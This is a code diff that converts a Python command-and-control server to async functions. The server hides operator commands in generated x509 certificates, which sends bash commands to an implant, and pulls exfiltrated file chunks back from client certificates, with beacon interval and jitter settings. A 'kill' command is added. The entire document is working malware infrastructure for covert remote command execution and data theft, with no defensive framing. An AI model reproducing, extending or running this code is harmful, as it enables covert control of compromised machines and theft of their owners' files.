@@ -1,4 +1,5 @@
 import time
+import asyncio
 import socket
 import ssl
 from pathlib import Path
@@ -32,13 +33,13 @@ def close_file_handle(file_name):
         file_handles.pop(file_name)
 
 
-def dump_exfil_data(cert, output_dir):
+async def dump_exfil_data(cert, output_dir):
     """ Write exfiltration data to file """
     global timer, last_time
     """
     msg format: is_first|is_last|len_of_data_chuck|file_name
     """
-    msg, msg_data = get_cert_msg(cert, bytes_2_text=False)
+    msg, msg_data = await get_cert_msg(cert, bytes_2_text=False)
     transfer_state, chuck_len, file_name = msg.split("|")
     transfer_state = int(transfer_state)
     chuck_len = int(chuck_len)
@@ -59,7 +60,7 @@ def dump_exfil_data(cert, output_dir):
     return transfer_state
 
 
-def do_exfil(listen_addr, listen_port, ca_cert_path, cmd_cert, output_dir):
+async def do_exfil(listen_addr, listen_port, ca_cert_path, cmd_cert, output_dir):
     """ Create a socket for data exfiltration of a multipart file. This function
     loops through the client cert messages until the file is fully exfiltrated.
     """
@@ -80,7 +81,7 @@ def do_exfil(listen_addr, listen_port, ca_cert_path, cmd_cert, output_dir):
         cert = secure_sock.getpeercert(binary_form=True)
         cert = x509.load_der_x509_certificate(cert)
         # write data blob
-        download_state = dump_exfil_data(cert, output_dir)
+        download_state = await dump_exfil_data(cert, output_dir)
         # send msg back
         # data = secure_sock.read(1024)
         # secure_sock.write(data)
@@ -88,7 +89,7 @@ def do_exfil(listen_addr, listen_port, ca_cert_path, cmd_cert, output_dir):
     server_socket.close()
 
 
-def listen_for_client(listen_addr, listen_port, ca_cert_path, cmd_cert):
+async def listen_for_client(listen_addr, listen_port, ca_cert_path, cmd_cert):
     """ Create a socket with the next command for the client """
     print(f"{Colors.LIGHT_CYAN}Creating server side socket{Colors.ENDC}")
     msg_cert, msg_key = cmd_cert
@@ -104,7 +105,7 @@ def listen_for_client(listen_addr, listen_port, ca_cert_path, cmd_cert):
             cert = secure_sock.getpeercert(binary_form=True)
             cert = x509.load_der_x509_certificate(cert)
             # get client msg
-            msg, data = get_cert_msg(cert)
+            msg, data = await get_cert_msg(cert)
             # send msg back
             # data = secure_sock.read(1024)
             # secure_sock.write(data)
@@ -112,9 +113,9 @@ def listen_for_client(listen_addr, listen_port, ca_cert_path, cmd_cert):
     return msg, data
 
 
-def start_server(listen_addr, listen_port, cert_root_path, ca_cert_path, ca_key_path, passphrase, subject, beacon_interval, beacon_jitter, output_dir):
+async def start_server(listen_addr, listen_port, cert_root_path, ca_cert_path, ca_key_path, passphrase, subject, beacon_interval, beacon_jitter, output_dir):
     gen_cert_path = f"{cert_root_path}/srv_certs"
-    ca_key, ca_cert = init_cert_gen(gen_cert_path, ca_cert_path, ca_key_path, passphrase)
+    ca_key, ca_cert = await init_cert_gen(gen_cert_path, ca_cert_path, ca_key_path, passphrase)
 
     # beacon interval and jitter
     wait_cmd = ("wait", f"{beacon_interval},{beacon_jitter}")
@@ -129,74 +130,61 @@ def start_server(listen_addr, listen_port, cert_root_path, ca_cert_path, ca_key_
     #     ("bash", "ls,certs/ca_certs")
     # ]
 
-    # pre-create the wait
-    wait_cmd_cert = gen_msg_cert(gen_cert_path, ca_cert, ca_key, subject, msg=wait_cmd[0], data=wait_cmd[1])
-    while True:
+    # pre-create the wait msg cert
+    wait_cmd_cert = await gen_msg_cert(gen_cert_path, ca_cert, ca_key, subject, msg=wait_cmd[0], data=wait_cmd[1])
+    keep_running = True
+    while keep_running:
         # listen for a client REQUEST
-        cmd, data = get_next_cmd()
-        print()
+        cmd, data = await get_next_cmd()
         # if len(commands) > 0:
         #     cmd, data = commands.pop(0)
         # else:
         #     cmd, data = noop_cmd
         # print(f"next client command: '{cmd}: {data}'")
-        cmd_cert = gen_msg_cert(gen_cert_path, ca_cert, ca_key, subject, msg=cmd, data=data)
-        client_msg, client_data = listen_for_client(listen_addr, listen_port, ca_cert_path, cmd_cert)
+        cmd_cert = await gen_msg_cert(gen_cert_path, ca_cert, ca_key, subject, msg=cmd, data=data)
+        client_msg, client_data = await listen_for_client(listen_addr, listen_port, ca_cert_path, cmd_cert)
         assert client_msg == "beacon" and client_data is None
-
-        if cmd == "exfil":
+        if cmd == "kill":
+            # client shut itself down, so shut the server down too
+            keep_running = False
+        elif cmd == "exfil":
             # exfil sets up a special loop to pull down file chunks
-            do_exfil(listen_addr, listen_port, ca_cert_path, cmd_cert, output_dir)
+            await do_exfil(listen_addr, listen_port, ca_cert_path, cmd_cert, output_dir)
         else:
             # listen for a client RESPONSE
-            client_msg, client_data = listen_for_client(listen_addr, listen_port, ca_cert_path, wait_cmd_cert)
+            client_msg, client_data = await listen_for_client(listen_addr, listen_port, ca_cert_path, wait_cmd_cert)
             assert client_msg == "response"
             if client_data:
-                client_data = client_data.strip()
-                client_data = client_data.split("\n")
-                print()
-                print(f"{Colors.LIGHT_YELLOW}client response:{Colors.ENDC}")
+                client_data = client_data.strip().split("\n")
+                print(f"\n{Colors.LIGHT_YELLOW}client response:{Colors.ENDC}")
                 for line in client_data:
                     print(f"{Colors.LIGHT_YELLOW}\t{line}{Colors.ENDC}")
+    print(f"{Colors.RED}SHUTTING DOWN{Colors.ENDC}")
 
 
-def get_next_cmd():
+async def get_next_cmd():
+    cmd_type = None
+    cmd_data = None
     print()
-    while True:
+    while cmd_data is None:
         cmd_type = input(f"{Colors.LIGHT_GREEN}Enter a command type ('bash', 'exfil', 'kill'): {Colors.ENDC}").strip()
         if cmd_type == "bash":
             cmd_data = input(f"{Colors.LIGHT_GREEN}Enter the bash command: {Colors.ENDC}").strip()
-            return cmd_type, cmd_data
         elif cmd_type == "wait":
             interval = input(f"{Colors.LIGHT_GREEN}Enter beacon interval: {Colors.ENDC}").strip()
             jitter = input(f"{Colors.LIGHT_GREEN}Enter beacon jitter: {Colors.ENDC}").strip()
-            return cmd_type, f"{interval},{jitter}"
+            cmd_data = f"{interval},{jitter}"
         elif cmd_type == "exfil":
             cmd_data = input(f"{Colors.LIGHT_GREEN}Enter file path: {Colors.ENDC}").strip()
-            return cmd_type, cmd_data
         elif cmd_type == "kill":
-            return cmd_type, None
+            cmd_data = "kill"
         else:
             print(f"{Colors.RED}Invalid command type, please try again{Colors.ENDC}")
-
+    print()
+    return cmd_type, cmd_data
 
 
 def main():
-    # print(f"{Colors.RED}Generating x509 cert with message{Colors.ENDC}")
-    # print(f"{Colors.GREEN}Generating x509 cert with message{Colors.ENDC}")
-    # print(f"{Colors.YELLOW}Generating x509 cert with message{Colors.ENDC}")
-    # print(f"{Colors.BLUE}Generating x509 cert with message{Colors.ENDC}")
-    # print(f"{Colors.PURPLE}Generating x509 cert with message{Colors.ENDC}")
-    # print(f"{Colors.CYAN}Generating x509 cert with message{Colors.ENDC}")
-    # print(f"{Colors.LIGHT_GREY}Generating x509 cert with message{Colors.ENDC}")
-    # print(f"{Colors.GREY}Generating x509 cert with message{Colors.ENDC}")
-    # print(f"{Colors.LIGHT_RED}Generating x509 cert with message{Colors.ENDC}")
-    # print(f"{Colors.LIGHT_GREEN}Generating x509 cert with message{Colors.ENDC}")
-    # print(f"{Colors.LIGHT_YELLOW}Generating x509 cert with message{Colors.ENDC}")
-    # print(f"{Colors.LIGHT_BLUE}Generating x509 cert with message{Colors.ENDC}")
-    # print(f"{Colors.LIGHT_PURPLE}Generating x509 cert with message{Colors.ENDC}")
-    # print(f"{Colors.LIGHT_CYAN}Generating x509 cert with message{Colors.ENDC}")
-    # print(f"{Colors.WHITE}Generating x509 cert with message{Colors.ENDC}")
     listen_addr = '127.0.0.1'
     listen_port = 8089
     passphrase = b'hackerman'
@@ -213,9 +201,9 @@ def main():
     }
     beacon_interval = 5
     beacon_jitter = 30
-    start_server(listen_addr, listen_port,
+    asyncio.run(start_server(listen_addr, listen_port,
                  cert_root_path, ca_cert, ca_key, passphrase,
-                 subject, beacon_interval, beacon_jitter, output_dir)
+                 subject, beacon_interval, beacon_jitter, output_dir))
 
 
 if __name__ == '__main__':
